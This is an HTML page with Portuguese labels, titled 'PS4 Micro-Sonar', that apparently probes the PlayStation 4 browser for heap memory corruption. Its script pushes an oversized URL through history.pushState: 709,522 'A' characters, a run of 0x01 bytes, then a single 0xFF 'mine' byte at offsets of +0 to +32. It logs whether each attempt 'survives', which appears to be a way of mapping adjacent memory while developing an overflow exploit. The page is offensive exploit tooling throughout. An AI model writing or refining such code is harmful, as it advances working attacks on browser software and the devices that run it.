<!DOCTYPE html>
<html>
<head>
    <title>PS4 Micro-Sonar</title>
    <style>
        body { background-color: #000; color: #ff0055; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 20px; margin: 15px; cursor: pointer; 
            width: 100%; border: 2px solid #ff0055; background: #220000; color: #fff; font-weight: bold;
        }
        #log { margin-top: 20px; border: 1px solid #555; padding: 15px; color: cyan; text-align: left; }
    </style>
</head>
<body>

    <h1>Micro-Sonar de Vizinhos</h1>
    <p>O vizinho está muito perto. Onde exatamente?</p>

    <div id="log">Pronto. Base: 709.522</div>

    <button onclick="pingMicro(0)">1. Testar Imediato (+0 bytes)</button>
    <button onclick="pingMicro(8)">2. Testar +8 bytes</button>
    <button onclick="pingMicro(16)">3. Testar +16 bytes</button>
    <button onclick="pingMicro(24)">4. Testar +24 bytes</button>
    <button onclick="pingMicro(32)">5. Testar +32 bytes</button>

    <script>
        const BASE_OFFSET = 709522;

        function log(msg) {
            document.getElementById('log').innerHTML += `<div>${msg}</div>`;
        }

        function pingMicro(distance) {
            log(`Injetando 0xFF na distância +${distance}...`);
            
            setTimeout(() => {
                try {
                    // 1. Base Segura
                    let buffer = "A".repeat(BASE_OFFSET);
                    
                    // 2. Ponte Segura (0x01) até o ponto de teste
                    if (distance > 0) {
                        buffer += "\x01".repeat(distance);
                    }
                    
                    // 3. A Mina (0xFF)
                    buffer += "\xFF";

                    // Dispara
                    history.pushState({}, "micro_" + distance, "/" + buffer);
                    
                    log(`SOBREVIVEU! Distância +${distance} é segura.`);

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 500);
        }
    </script>
</body>
</html>
